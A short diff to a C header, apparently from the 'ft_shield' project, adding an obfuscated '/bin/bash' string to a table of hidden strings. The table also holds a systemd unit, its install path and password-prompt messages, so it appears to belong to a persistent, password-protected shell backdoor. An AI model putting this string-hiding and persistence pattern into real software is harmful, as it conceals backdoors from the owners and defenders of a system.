@@ -14,6 +14,7 @@ typedef enum ObfuscatedStringTableIndex {
     SYSTEMD_CONFIG_PATH,
     INVALID_PASSWORD_TRY_AGAIN,
     LOGIN_SUCCESSFUL,
+    BIN_BASH,
 } ObfuscatedStringTableIndex;
 
 // Will be preprocessed for codegen by scripts/encode.py
@@ -28,6 +29,7 @@ static uint8_t systemd_config[] = OBFUSCATE("[Unit]\nDescription=None of your bu
 static uint8_t systemd_config_path[] = OBFUSCATE("/etc/systemd/system/ft_shield.service");
 static uint8_t invalid_password_try_again[] = OBFUSCATE("Invalid password, try again\n");
 static uint8_t login_successful[] = OBFUSCATE("Login successful\n");
+static uint8_t bin_bash[] = OBFUSCATE("/bin/bash");
 
 
 static ObfuscatedStringTableEntry strings[] = {
@@ -40,6 +42,7 @@ static ObfuscatedStringTableEntry strings[] = {
     {.data = (uint8_t *)systemd_config_path,        .len = sizeof(systemd_config_path),        .decoded = false},
     {.data = (uint8_t *)invalid_password_try_again, .len = sizeof(invalid_password_try_again), .decoded = false},
     {.data = (uint8_t *)login_successful,           .len = sizeof(login_successful),           .decoded = false},
+    {.data = (uint8_t *)bin_bash,           .len = sizeof(bin_bash),           .decoded = false},
 };
 
 #endif
